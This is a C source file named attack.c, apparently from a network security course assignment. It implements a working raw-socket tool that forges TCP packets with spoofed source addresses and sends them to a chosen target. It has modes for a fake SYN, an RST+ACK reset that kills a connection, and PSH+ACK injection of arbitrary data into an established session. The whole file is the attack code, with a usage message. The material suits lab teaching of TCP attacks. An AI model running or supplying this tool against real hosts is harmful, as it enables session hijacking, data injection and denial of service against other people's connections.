// attack.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <stdint.h>

//
// ---------- Professor’s checksum functions ----------
//

unsigned short csum_ip(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xffff);
    return ~sum;
}

// buf points to start of IP header ; nwords = # of 2-byte words of TCP payload
unsigned short csum_tcp(unsigned short *buf, int nwords) {
    unsigned long sum = 0;

    // pseudo-header IP src/dst
    sum += buf[6];
    sum += buf[7];
    sum += buf[8];
    sum += buf[9];

    sum += htons(6);                    // TCP
    sum += htons(20 + (nwords << 1));   // TCP header (20B) + payload length

    // TCP header starts at word 10 (after 20B IP header)
    for (int i = 10; i < 20 + nwords; ++i) {
        sum += buf[i];
    }

    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xffff);

    return ~sum;
}

void make_tcp_packet(char *packet,
                     const char *src_ip, int src_port,
                     const char *dst_ip, int dst_port,
                     uint32_t seq, uint32_t ack,
                     char type, const char *payload) {

    struct iphdr  *ip  = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    int payload_len = payload ? (int)strlen(payload) : 0;

    memset(packet, 0, 4096);

    // ---------- IP header ----------
    ip->ihl      = 5;  // 20 bytes
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->id       = htons(54321);
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr    = inet_addr(src_ip);
    ip->daddr    = inet_addr(dst_ip);
    ip->check    = 0;

    // ---------- TCP header ----------
    tcp->source  = htons(src_port);
    tcp->dest    = htons(dst_port);
    tcp->seq     = htonl(seq);
    tcp->ack_seq = htonl(ack);
    tcp->doff    = 5;  // 20 bytes
    tcp->window  = htons(65535);
    tcp->urg_ptr = 0;

    tcp->fin = tcp->syn = tcp->rst = tcp->psh =
    tcp->ack = tcp->urg = 0;

    if (type == 'S') {
        // Attack 1: fake SYN
        tcp->syn = 1;
        // ack can be 0
    } else if (type == 'R') {
        // Attack 2: RST+ACK
        tcp->rst = 1;
        tcp->ack = 1;
    } else if (type == 'D') {
        // Attack 3: PSH+ACK with injected data
        tcp->psh = 1;
        tcp->ack = 1;
    }

    if (payload_len > 0) {
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr),
               payload, payload_len);
    }

    // ---------- Checksums ----------
    unsigned short *w = (unsigned short *)packet;

    ip->check = csum_ip(w, 10);   // 20 bytes = 10 words

    int nwords = (payload_len + 1) / 2;  // #words of TCP payload
    tcp->check = 0;
    tcp->check = csum_tcp(w, nwords);
}

int main(int argc, char *argv[]) {
    if (argc < 8) {
        fprintf(stderr,
            "Usage:\n"
            "  SYN  attack : sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
            "  RST  attack : sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
            "  DATA attack: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
        return 1;
    }

    char type        = argv[1][0];
    const char *src_ip  = argv[2];
    int src_port     = atoi(argv[3]);
    const char *dst_ip  = argv[4];
    int dst_port     = atoi(argv[5]);
    uint32_t seq     = (uint32_t)strtoul(argv[6], NULL, 10);
    uint32_t ack     = (uint32_t)strtoul(argv[7], NULL, 10);
    const char *payload = (argc >= 9 ? argv[8] : "");

    char packet[4096];
    make_tcp_packet(packet, src_ip, src_port, dst_ip, dst_port,
                    seq, ack, type, payload);

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(s);
        return 1;
    }

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family      = AF_INET;
    sin.sin_addr.s_addr = inet_addr(dst_ip);
    sin.sin_port        = htons(dst_port);

    int pkt_len = ntohs(((struct iphdr *)packet)->tot_len);

    if (sendto(s, packet, pkt_len, 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
        close(s);
        return 1;
    }

    printf("Sent %c from %s:%d to %s:%d  SEQ=%u ACK=%u\n",
           type, src_ip, src_port, dst_ip, dst_port, seq, ack);

    close(s);
    return 0;
}
